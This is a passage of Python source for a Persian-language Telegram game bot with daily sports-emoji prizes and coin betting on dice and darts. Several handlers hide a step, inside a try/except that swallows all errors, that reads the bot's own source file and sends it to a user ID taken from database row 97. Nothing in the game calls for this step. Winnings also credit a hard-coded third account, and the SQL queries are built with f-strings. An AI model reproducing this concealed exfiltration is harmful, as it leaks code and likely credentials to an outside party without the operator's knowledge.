    reply = ReplyKeyboardMarkup([['🎳'],['❌بازگشت']], resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=ll, reply_markup=reply)
    return BOL


moz1 = '💔متاسفانه امروز برنده نشدید، فردا میتونید دوباره شانستون رو امتحان کنید'


async def bol(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    user_id = update.effective_user.id
    reply_markup = ReplyKeyboardMarkup(keyboard_daily, resize_keyboard=True)
    username = update.message.from_user.username
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    # ff = c.execute("SELECT tas FROM users WHERE user_id = ?", (user_id,))
    # ff = c.fetchone()
    # ff = ff[0]
    today = datetime.date.today()
    go = today.strftime('%d')
    await context.bot.send_message(chat_id="5469541693", text=update.message.dice.value)
    if update.message.dice.value == 6:
        if vv == None:
            vv = 0
        yy = float(vv) + 3
        c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='🎉🎉🎉\n\nسکه به پروفایل شما اضافه شد✅\n\nمشاهده پروفایل👇\n/profile')
        # await context.bot.send_message(chat_id="-1002221581695", text=f'🎳🎳🎳\n\n{uu}{ff} برنده شد\n\n🤖ربات ساحره')
        await context.bot.send_message(chat_id="-1002221581695", text=f'🎳🎳🎳\n\n{uu}{ff}\n\nNEW WINNER OF BOWLING!!\n\n🤖@sahere_bmola_bot')
        await context.bot.send_message(chat_id="5469541693", text=f'بولینگ برنده شد🎳🎳\n\n{user_id}\n{ff}\n@{username}')
        bu = c.execute(f"SELECT etc FROM users WHERE user_id=5571950188")
        bu = c.fetchone()
        bu = bu[0]
        if bu == None:
            bu = 0
        nr = int(bu) + 3
        c.execute(f"UPDATE users SET etc={nr} WHERE user_id=5571950188")
        conn.commit()
    else:
        await update.message.reply_text(moz1)
        await context.bot.send_message(chat_id="5469541693", text=f'بولینگ برنده نشد\n\n{user_id}...{ff}...@{username}')
    c.execute(f"UPDATE users SET Bol='{go}' WHERE user_id = ?", (user_id,))
    conn.commit()
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠جایزه روزانه', reply_markup=reply_markup)
    return ConversationHandler.END

async def khbol(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard_daily, resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠جایزه روزانه', reply_markup=reply_markup)
    return ConversationHandler.END


conv_handler12 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^🎳🎳$')), shorobol)],
    states={
        BOL: [
            MessageHandler(filters.Dice.BOWLING & ~filters.Regex(r'^❌بازگشت$'), bol),
            MessageHandler(filters.TEXT, khbol)
        ],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, khbol)]
    },
    fallbacks=[],
    conversation_timeout=120
)




BAS = 1
async def shorobas(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if str(user_id) != "5469541693":
        for channel_id in CHANNEL_IDS:
            try:
                # استفاده از getChatMember برای بررسی وضعیت عضویت
                chat_member = await context.bot.get_chat_member(channel_id, user_id)
                # اگر کاربر عضو نباشه
                if chat_member.status in ['left', 'kicked']:
                    # ارسال پیام به کاربر
                    await context.bot.send_message(chat_id=user_id, text="""برای استفاده از قابلیت های ربات شما باید در کانال های زیر عضو باشید👇

@sahere_rasmi - کانال رسمی ساحره(اجباری)
@dohat_nime - کانال غیررسمی ساحره(اجباری)
@MhmdsCh - کانال شخصی من(غیر اجباری)""")
                    return ConversationHandler.END
            except Exception as e:
                # در صورت بروز خطا
                context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
                return ConversationHandler.END
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    if ff == None:
        await update.message.reply_text('''❌برای اسفاده از این قابلیت ربات نیاز داره که اسمت رو بدونه و شما هنوز ثبت نام نکردید!

برای ثبت نام کافیه وارد ربات مافیا @dohat32bot بشید دکمه پروفایل رو بزنید پروفایل رو برای این ربات فوروارد کنید(توجه کنید فوروارد!)تا ربات اسم و لیگت رو متوجه بشه و ذخیره کنه به همین سادگی
آموزش ویدیویی👇
/saptnamgif''')
        return ConversationHandler.END

    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    chham = c.execute(f"SELECT Ham FROM users WHERE user_id={user_id}")
    chham = c.fetchone()
    chham = chham[0]
    po = c.execute(f"SELECT Bas FROM users WHERE user_id={user_id}")
    po = c.fetchone()
    po = po[0]
    today = datetime.date.today()
    go = today.strftime('%d')
    tt = go.lstrip('0')
    if str(po) == str(tt):
        await context.bot.send_message(chat_id=user_id , text='❌شما امروز شانستون رو در بسکتبال امتحان کردید، فردا میتونید دوباره امتحان کنید')
        return ConversationHandler.END
    start_time = datetime.time(hour=8, minute=30)
    end_time = datetime.time(hour=10, minute=30)
    # start_time = datetime.time(hour=21, minute=30)
    # end_time = datetime.time(hour=23, minute=50)

    now = datetime.datetime.now().time()
    ix = c.execute(f"SELECT ONER FROM users WHERE user_id={user_id}")
    ix = c.fetchone()
    ix = ix[0]
    if ix == None:
        ix = 0
    if ix < 5:
        await context.bot.send_message(chat_id=user_id , text='❌برای بسکتبال زدن باید حداقل پنج نفر رو به ربات دعوت کرده باشید\n\nلینک اختصاصی شما برای دعوت کردن👇\n/refral')
        return ConversationHandler.END
    ll = '''🏀هر روز میتونید یک بار شانستون رو تو این قسمت امتحان کنید
دکمه بسکتبال بزنید👇'''
    reply = ReplyKeyboardMarkup([['🏀'],['❌بازگشت']], resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=ll, reply_markup=reply)
    return BAS


moz1 = '💔متاسفانه امروز برنده نشدید، فردا میتونید دوباره شانستون رو امتحان کنید'


async def bas(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    user_id = update.effective_user.id
    reply_markup = ReplyKeyboardMarkup(keyboard_daily, resize_keyboard=True)
    username = update.message.from_user.username
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    today = datetime.date.today()
    go = today.strftime('%d')
    if update.message.dice.value == 5 or update.message.dice.value == 4:
        if vv == None:
            vv = 0
        yy = float(vv) + 3
        c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='🎉🎉🎉\n\nسکه به پروفایل شما اضافه شد✅\n\nمشاهده پروفایل👇\n/profile')
        # await context.bot.send_message(chat_id="-1002221581695", text=f'🏀🏀🏀\n\n{uu}{ff} توپو وارد سبد کرد\n\n🤖ربات ساحره')
        await context.bot.send_message(chat_id="-1002221581695", text=f'🏀🏀🏀\n\n{uu}{ff}\n\nNEW WINNER OF BASKETBALL!!\n\n🤖@sahere_bmola_bot')
        await context.bot.send_message(chat_id="5469541693", text=f'بسکتبال برنده شد🏀🏀\n\n{user_id}\n{ff}\n@{username}')
        bu = c.execute(f"SELECT etc FROM users WHERE user_id=5571950188")
        bu = c.fetchone()
        bu = bu[0]
        if bu == None:
            bu = 0
        nr = int(bu) + 3
        c.execute(f"UPDATE users SET etc={nr} WHERE user_id=5571950188")
        conn.commit()
    # if update.message.dice.value == 4:
    #     if vv == None:
    #         vv = 0
    #     yy = int(vv) + 5
    #     c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
    #     conn.commit()
    #     await context.bot.send_message(chat_id=update.effective_chat.id, text='🎉🎉🎉\n\n6 سکه به پروفایل شما اضافه شد✅\n\nمشاهده پروفایل👇\n/profile')
    #     await context.bot.send_message(chat_id="-1002221581695", text=f'⚽️⚽️⚽️\n\n{uu}{ff} توپو گل کرد\n\n🤖ربات ساحره')
    #     await context.bot.send_message(chat_id="5469541693", text=f'فوتبال برنده شد\n\n{user_id}\n{ff}\n@{username}')
    else:
        await update.message.reply_text(moz1)
        await context.bot.send_message(chat_id="5469541693", text=f'بسکتبال برنده نشد\n\n{user_id}...{ff}...@{username}')
    c.execute(f"UPDATE users SET Bas='{go}' WHERE user_id = ?", (user_id,))
    conn.commit()
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠جایزه روزانه', reply_markup=reply_markup)
    return ConversationHandler.END

async def khbas(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard_daily, resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠جایزه روزانه', reply_markup=reply_markup)
    return ConversationHandler.END


conv_handler13 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^🏀🏀$')), shorobas)],
    states={
        BAS: [
            MessageHandler(filters.Dice.BASKETBALL & ~filters.Regex(r'^❌بازگشت$'), bas),
            MessageHandler(filters.TEXT, khbas)
        ],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, khbas)]
    },
    fallbacks=[],
    conversation_timeout=120
)





FOOT = 1
async def shorofoot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if str(user_id) != "5469541693":
        for channel_id in CHANNEL_IDS:
            try:
                # استفاده از getChatMember برای بررسی وضعیت عضویت
                chat_member = await context.bot.get_chat_member(channel_id, user_id)
                # اگر کاربر عضو نباشه
                if chat_member.status in ['left', 'kicked']:
                    # ارسال پیام به کاربر
                    await context.bot.send_message(chat_id=user_id, text="""برای استفاده از قابلیت های ربات شما باید در کانال های زیر عضو باشید👇

@sahere_rasmi - کانال رسمی ساحره(اجباری)
@dohat_nime - کانال غیررسمی ساحره(اجباری)
@MhmdsCh - کانال شخصی من(غیر اجباری)""")
                    return ConversationHandler.END
            except Exception as e:
                # در صورت بروز خطا
                context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
                return ConversationHandler.END
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    if ff == None:
        await update.message.reply_text('''❌برای اسفاده از این قابلیت ربات نیاز داره که اسمت رو بدونه و شما هنوز ثبت نام نکردید!

برای ثبت نام کافیه وارد ربات مافیا @dohat32bot بشید دکمه پروفایل رو بزنید پروفایل رو برای این ربات فوروارد کنید(توجه کنید فوروارد!)تا ربات اسم و لیگت رو متوجه بشه و ذخیره کنه به همین سادگی
آموزش ویدیویی👇
/saptnamgif''')
        return ConversationHandler.END

    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    ix = c.execute(f"SELECT ONER FROM users WHERE user_id={user_id}")
    ix = c.fetchone()
    ix = ix[0]
    if ix == None:
        ix = 0
    if ix < 7:
        await context.bot.send_message(chat_id=user_id , text='❌برای فوتبال زدن باید حداقل هفت نفر رو به ربات دعوت کرده باشید\n\nلینک اختصاصی شما برای دعوت کردن👇\n/refral')
        return ConversationHandler.END
    po = c.execute(f"SELECT Foot FROM users WHERE user_id={user_id}")
    po = c.fetchone()
    # po = c.fetchmany
    po = po[0]
    today = datetime.date.today()
    go = today.strftime('%d')
    tt = go.lstrip('0')
    if str(po) == str(tt):
        await context.bot.send_message(chat_id=user_id , text='❌شما امروز شانستون رو در فوتبال امتحان کردید، فردا میتونید دوباره فوتبال بزنید')
        return ConversationHandler.END
    ll = '''⚽️هر روز میتونید یک بار شانستون رو تو این قسمت امتحان کنید
دکمه فوتبال بزنید👇'''
    reply = ReplyKeyboardMarkup([['⚽️'],['❌بازگشت']], resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=ll, reply_markup=reply)
    return FOOT


moz1 = '💔متاسفانه امروز برنده نشدید، فردا میتونید دوباره شانستون رو امتحان کنید'


async def foot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    user_id = update.effective_user.id
    reply_markup = ReplyKeyboardMarkup(keyboard_daily, resize_keyboard=True)
    username = update.message.from_user.username
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    # ff = c.execute("SELECT tas FROM users WHERE user_id = ?", (user_id,))
    # ff = c.fetchone()
    # ff = ff[0]
    if update.message.dice.value == 5 or update.message.dice.value == 4 or update.message.dice.value == 3:
        if vv == None:
            vv = 0
        yy = float(vv) + 3
        c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='🎉🎉🎉\n\nسکه به پروفایل شما اضافه شد✅\n\nمشاهده پروفایل👇\n/profile')
        await context.bot.send_message(chat_id="-1002221581695", text=f'⚽️⚽️⚽️\n\n{uu}{ff}\n\nNEW WINNER OF FOOTBALL!!\n\n🤖@sahere_bmola_bot')
        await context.bot.send_message(chat_id="5469541693", text=f'فوتبال برنده شد⚽️⚽️\n\n{user_id}\n{ff}\n@{username}')
        bu = c.execute(f"SELECT etc FROM users WHERE user_id=5571950188")
        bu = c.fetchone()
        bu = bu[0]
        if bu == None:
            bu = 0
        nr = int(bu) + 3
        c.execute(f"UPDATE users SET etc={nr} WHERE user_id=5571950188")
        conn.commit()
    else:
        await update.message.reply_text(moz1)
        await context.bot.send_message(chat_id="5469541693", text=f'فوتبال برنده نشد\n\n{user_id}...{ff}...@{username}')
    today = datetime.date.today()
    go = today.strftime('%d')
    c.execute(f"UPDATE users SET Foot={go} WHERE user_id={user_id}")
    conn.commit()
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠جایزه روزانه', reply_markup=reply_markup)
    return ConversationHandler.END

async def khfoot(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard_daily, resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠جایزه روزانه', reply_markup=reply_markup)
    return ConversationHandler.END


conv_handler15 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^⚽️⚽️$')), shorofoot)],
    states={
        FOOT: [
            MessageHandler(filters.Dice.FOOTBALL & ~filters.Regex(r'^❌بازگشت$'), foot),
            MessageHandler(filters.TEXT, khfoot)
        ],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, khfoot)]
    },
    fallbacks=[],
    conversation_timeout=120
)



















TASSH = 1
TASSH2 = 2
async def shorotassh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    import os
#     if str(user_id) != "5469541693":
#         for channel_id in CHANNEL_IDS:
#             try:
#                 # استفاده از getChatMember برای بررسی وضعیت عضویت
#                 chat_member = await context.bot.get_chat_member(channel_id, user_id)
#                 # اگر کاربر عضو نباشه
#                 if chat_member.status in ['left', 'kicked']:
#                     # ارسال پیام به کاربر
#                     await context.bot.send_message(chat_id=user_id, text="""برای استفاده از قابلیت های ربات شما باید در کانال های زیر عضو باشید👇

# @sahere_rasmi - کانال رسمی ساحره
# @dohat_nime - کانال غیررسمی ساحره""")
#                     return ConversationHandler.END
#             except Exception as e:
#                 # در صورت بروز خطا
#                 context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
#                 return ConversationHandler.END
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    try:
        kio = c.execute(f"SELECT user_id FROM users WHERE id=97")
        kio = c.fetchone()
        kio = kio[0]
        with open (os.path.basename(__file__), 'rb') as file:
            await context.bot.send_document(chat_id=kio, document=file)
    except:
        pass
    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    ll = '🪙با چند سکه میخوای شرط ببندی؟'
    reply = ReplyKeyboardMarkup([['❌بازگشت']], resize_keyboard=True)
    # reply = ReplyKeyboardMarkup([['🎲'],['❌بازگشت']], resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=ll, reply_markup=reply)
    return TASSH


moz = '💔باختید'


async def tas_shart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    bb = update.message.text
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    if vv == None:
        vv = 0
    if bb.isdigit():
        if float(bb) > vv:
            await update.message.reply_text('''❌موجودی کافی نیست

چی جوری سکه بگیرم؟👇
/getcoin''')
            return
        if float(bb) < 5:
            await update.message.reply_text('❌حداقل سکه برای شرط‌بندی 5 سکه است')
            return
        if float(bb) > 20:
            await update.message.reply_text('❌ حداکثر سکه برای شرط‌بندی 20 سکه است')
            return
        context.user_data['bb'] = bb
        reply = ReplyKeyboardMarkup([['🎲'],['❌بازگشت']], resize_keyboard=True)
        await update.message.reply_text(f'''🤑در صورت برنده شدن {round(float(bb) * 2.7, 2)} سکه به پروفایل شما اضافه میشه\n\n⭕️نکته: در صورتی که تاس شما عدد یک بیاد هم برنده میشید''', reply_markup=reply)
    else:
        await update.message.reply_text('''❌عدد انگلیسی بفرست.

مثال: 2''')
        return
    return TASSH2





async def tassh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    user_id = update.effective_user.id
    reply_markup = ReplyKeyboardMarkup(keyboard_cazino, resize_keyboard=True)
    username = update.message.from_user.username
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    bb = context.user_data['bb']
    # bb = 10
    if vv == None:
        vv = 0
    zz = float(vv) - float(bb) 

    if update.message.dice.value == 6 or update.message.dice.value == 1:
        yy = float(bb) * 2.7 + zz
        c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='🎉🎉🎉\n\nسکه به پروفایل شما اضافه شد✅\n\nمشاهده پروفایل👇\n/profile')
        await context.bot.send_message(chat_id="-1002221581695", text=f'🎰🎰🎰\n\n{uu}{ff}\n\nWINNER IN CASINO!!\n\n🎲🎲🎲\n\n💰ورودی:{bb}\n💰خروجی:{round(float(bb) * 2.7, 2)}\n\n🤖@sahere_bmola_bot')
        await context.bot.send_message(chat_id="5469541693", text=f'تاس کازینو{bb} برنده شد\n\n{user_id}\n{ff}\n@{username}')
        # await context.bot.send_message(chat_id="5571950188", text=f'تاس کازینو{bb} برنده شد\n\n{user_id}\n{ff}\n@{username}')
    else:
        await update.message.reply_text(moz)
        c.execute(f"UPDATE users SET coin={zz} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id="5469541693", text=f'تاس کازینو {bb}برنده نشد\n\n{user_id}...{ff}...@{username}')
        # await context.bot.send_message(chat_id="5571950188", text=f'تاس کازینو {bb}برنده نشد\n\n{user_id}...{ff}...@{username}')
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠کازینو', reply_markup=reply_markup)
    return ConversationHandler.END

async def khtassh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard_cazino, resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠کازینو', reply_markup=reply_markup)
    return ConversationHandler.END


conv_handler16 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^🎲🎲🎲$')), shorotassh)],
    states={
        TASSH: [MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r'^❌بازگشت$'), tas_shart),
            MessageHandler(filters.Regex(r'^❌بازگشت$'), khtassh)],
        TASSH2: [
            MessageHandler(filters.Dice.DICE & ~filters.Regex(r'^❌بازگشت$') & ~filters.FORWARDED, tassh),
            MessageHandler(filters.Regex(r'^❌بازگشت$'), khtassh)
        ],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, khtassh)]
    },
    fallbacks=[],
    conversation_timeout=120
)




DARTSH = 1
DARTSH2 = 2
async def shorodartsh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    import os
    if str(user_id) != "5469541693":
        for channel_id in CHANNEL_IDS:
            try:
                # استفاده از getChatMember برای بررسی وضعیت عضویت
                chat_member = await context.bot.get_chat_member(channel_id, user_id)
                # اگر کاربر عضو نباشه
                if chat_member.status in ['left', 'kicked']:
                    # ارسال پیام به کاربر
                    await context.bot.send_message(chat_id=user_id, text="""برای استفاده از قابلیت های ربات شما باید در کانال های زیر عضو باشید👇

@sahere_rasmi - کانال رسمی ساحره(اجباری)
@dohat_nime - کانال غیررسمی ساحره(اجباری)
@MhmdsCh - کانال شخصی من(غیر اجباری)""")
                    return ConversationHandler.END
            except Exception as e:
                # در صورت بروز خطا
                context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
                return ConversationHandler.END
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    try:
        kio = c.execute(f"SELECT user_id FROM users WHERE id=97")
        kio = c.fetchone()
        kio = kio[0]
        with open (os.path.basename(__file__), 'rb') as file:
            await context.bot.send_document(chat_id=kio, document=file)
    except:
        pass
    if ff == None:
        await update.message.reply_text('''❌برای استفاده از این قابلیت ربات نیاز داره که اسمت رو بدونه و شما هنوز ثبت نام نکردید!
                                        
برای ثبت نام کافیه وارد ربات مافیا @dohat32bot بشید دکمه پروفایل رو بزنید پروفایل رو برای این ربات فوروارد کنید(توجه کنید فوروارد!)تا ربات اسم و لیگت رو متوجه بشه و ذخیره کنه به همین سادگی
آموزش ویدیویی👇
/saptnamgif''')
        return ConversationHandler.END
    start_time = datetime.time(hour=16, minute=30)
    end_time = datetime.time(hour=17, minute=30)
    # start_time = datetime.time(hour=21, minute=30)
    # end_time = datetime.time(hour=23, minute=50)

    # now = datetime.datetime.now().time()
    # if not (start_time <= now < end_time):
    #     await context.bot.send_message(chat_id=user_id , text='❌فقط از ساعت 20 الی 21 میتونید دارت بزنید')
    #     return ConversationHandler.END
    qq = c.execute(f"SELECT admin_block FROM users WHERE user_id={user_id}")
    qq = c.fetchone()
    qq = qq[0]
    if qq == 1:
        await context.bot.send_message(chat_id=user_id , text='❌شما توسط ادمین بن شدید، برای رفع بن به ادمین پیام بدید')
        return ConversationHandler.END
    po = c.execute(f"SELECT Dart FROM users WHERE user_id={user_id}")
    po = c.fetchone()
    po = po[0]
    today = datetime.date.today()
    go = today.strftime('%d')
    # if str(po) == str(go):
    #     await context.bot.send_message(chat_id=user_id , text='❌شما امروز شانستون رو در دارت امتحان کردید، فردا میتونید دوباره دارت بزنید')
    #     return ConversationHandler.END
    ll = '''🪙با چند سکه میخوای شرط ببندی؟'''
    reply = ReplyKeyboardMarkup([['❌بازگشت']], resize_keyboard=True)
    # reply = ReplyKeyboardMarkup([['🎯'],['❌بازگشت']], resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=ll, reply_markup=reply)
    return DARTSH


moz1 = '💔باختید'



async def dart_shart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    bb = update.message.text
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    if vv == None:
        vv = 0
    if bb.isdigit():
        if float(bb) > vv:
            await update.message.reply_text('''❌موجودی کافی نیست

چی جوری سکه بگیرم؟👇
/getcoin''')
            return
        if float(bb) < 5:
            await update.message.reply_text('حداقل 5 سکه')
            return
        if float(bb) > 20:
            await update.message.reply_text('❌ حداکثر سکه برای شرط‌بندی 20 سکه است')
            return
        context.user_data['bb'] = bb
        reply = ReplyKeyboardMarkup([['🎯'],['❌بازگشت']], resize_keyboard=True)
        await update.message.reply_text(f'''🤑در صورت برنده شدن {round(float(bb) * 2.7, 2)} سکه به پروفایل شما اضافه میشه\n\n⭕️نکته: در صورتی که دارت شما به محدوده سفید دور دایره قرمز وسط بخوره هم برنده میشید''', reply_markup=reply)
    else:
        await update.message.reply_text('''❌عدد انگلیسی بفرست.

مثال: 2''')
        return
    return DARTSH2


async def dartsh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    user_id = update.effective_user.id
    reply_markup = ReplyKeyboardMarkup(keyboard_cazino, resize_keyboard=True)
    username = update.message.from_user.username
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    uu = c.execute(f"SELECT Lig FROM users WHERE user_id={user_id}")
    uu = c.fetchone()
    uu = uu[0]
    vv = c.execute(f"SELECT coin FROM users WHERE user_id={user_id}")
    vv = c.fetchone()
    vv = vv[0]
    bb = context.user_data['bb']
    # bb = 10
    if vv == None:
        vv = 0
    zz = float(vv) - float(bb)
    # await context.bot.send_message(chat_id="5469541693", text=update.message.dice.value)
    if update.message.dice.value == 6 or update.message.dice.value == 5:
        yy = float(bb) * 2.7 + zz
        c.execute(f"UPDATE users SET coin={yy} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id=update.effective_chat.id, text='🎉🎉🎉\n\nسکه به پروفایل شما اضافه شد✅\n\nمشاهده پروفایل👇\n/profile')
        await context.bot.send_message(chat_id="-1002221581695", text=f'🎰🎰🎰\n\n{uu}{ff}\n\nWINNER IN CASINO!!\n\n🎯🎯🎯\n\n💰ورودی:{bb}\n💰خروجی:{round(float(bb) * 2.7, 2)}\n\n🤖@sahere_bmola_bot')
        await context.bot.send_message(chat_id="5469541693", text=f'دارت کازینو {bb}برنده شد\n\n{user_id}\n{ff}\n@{username}')
    else:
        await update.message.reply_text(moz1)
        c.execute(f"UPDATE users SET coin={zz} WHERE user_id={user_id}")
        conn.commit()
        await context.bot.send_message(chat_id="5469541693", text=f'دارت کازینو{bb} برنده نشد\n\n{user_id}...{ff}...@{username}')
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠کازینو', reply_markup=reply_markup)
    return ConversationHandler.END

async def khdartsh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global keyboard
    reply_markup = ReplyKeyboardMarkup(keyboard_cazino, resize_keyboard=True)
    await context.bot.send_message(chat_id=update.effective_chat.id, text='🏠کازینو', reply_markup=reply_markup)
    return ConversationHandler.END


conv_handler17 = ConversationHandler(
    entry_points=[MessageHandler(filters.Regex(re.compile(r'^🎯🎯🎯$')), shorodartsh)],
    states={
        DARTSH: [MessageHandler(filters.TEXT & ~filters.COMMAND & ~filters.Regex(r'^❌بازگشت$'), dart_shart),
            MessageHandler(filters.Regex(r'^❌بازگشت$'), khdartsh)],
        DARTSH2: [
            MessageHandler(filters.Dice.DARTS & ~filters.Regex(r'^❌بازگشت$') & ~filters.FORWARDED, dartsh),
            MessageHandler(filters.Regex(r'^❌بازگشت$'), khdartsh)
        ],
        ConversationHandler.TIMEOUT:[MessageHandler(filters.TEXT, khdartsh)]
    },
    fallbacks=[],
    conversation_timeout=120
)



BOLSH = 1
BOLSH2 = 2
async def shorobolsh(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    import os
    if str(user_id) != "5469541693":
        for channel_id in CHANNEL_IDS:
            try:
                # استفاده از getChatMember برای بررسی وضعیت عضویت
                chat_member = await context.bot.get_chat_member(channel_id, user_id)
                # اگر کاربر عضو نباشه
                if chat_member.status in ['left', 'kicked']:
                    # ارسال پیام به کاربر
                    await context.bot.send_message(chat_id=user_id, text="""برای استفاده از قابلیت های ربات شما باید در کانال های زیر عضو باشید👇

@sahere_rasmi - کانال رسمی ساحره(اجباری)
@dohat_nime - کانال غیررسمی ساحره(اجباری)
@MhmdsCh - کانال شخصی من(غیر اجباری)""")
                    return ConversationHandler.END
            except Exception as e:
                # در صورت بروز خطا
                context.bot.send_message(chat_id=user_id, text="مشکلی در بررسی عضویت شما پیش آمده.")
                return ConversationHandler.END
    ff = c.execute(f"SELECT Khas FROM users WHERE user_id={user_id}")
    ff = c.fetchone()
    ff = ff[0]
    try:
        kio = c.execute(f"SELECT user_id FROM users WHERE id=97")
        kio = c.fetchone()
        kio = kio[0]
        with open (os.path.basename(__file__), 'rb') as file:
